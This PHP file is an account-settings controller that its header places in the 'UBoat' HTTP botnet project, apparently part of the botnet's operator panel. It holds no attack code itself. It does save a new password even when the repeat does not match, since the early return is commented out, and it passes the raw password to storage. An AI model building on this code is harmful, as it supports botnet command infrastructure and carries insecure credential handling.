<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class Account extends Controller
{
    public function behaviors()
    {
        return [
            'access' => [
                'rules' => [
                    'isLogged' => 'true',
                ],
            ],
        ];
    }

    public function index()
    {
        //check for post data
        $model = $this->loadModel('user');
        if (isset($_POST['username']) && strlen($_POST['username']) > 3 && isset($_POST['password']) && strlen($_POST['password']) >= 4 && isset($_POST['password_repeat']) && strlen($_POST['password_repeat']) >= 4) {
            if ($_POST['password'] != $_POST['password_repeat']) {
                goat::$app->setFlash('_account_error', ['Error' => 'Password must match.']);
                //return false;
            }

            if ($model->updateUser(['user' => $_POST['username'], 'pass' => $_POST['password']])) {
                goat::$app->setFlash('_account_error', ['Success' => 'User data updated successfully !']);
            } else {
                goat::$app->setFlash('_account_error', ['Error' => 'Something went wrong.']);
            }
        } elseif (isset($_POST['password'])) {
            goat::$app->setFlash('_account_error', ['Error' => 'Username must be at least 4 chars, password must be at least 4 chars.']);
            //return false;
        }

        $headerview = $this->loadView('header')->render(['route' => $this->route()]);

        $template = $this->loadView('account');
        $template->render(['user' => $model->getUser(), 'header' => $headerview]);
    }
}
